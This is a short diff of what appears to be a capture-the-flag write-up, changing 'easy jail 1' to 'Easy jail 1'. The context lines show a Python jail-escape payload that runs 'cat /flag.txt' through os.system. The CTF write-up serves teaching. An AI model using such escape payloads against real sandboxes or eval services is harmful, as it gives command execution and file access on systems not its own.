@@ -110,7 +110,7 @@ p.interactive()
 ```
 # By `superman`
 
-- easy jail 1
+- Easy jail 1
     - `__import__('os').system('cat /flag.txt')`
 
 ![easyjail1.png](./images/easyjail1.png)
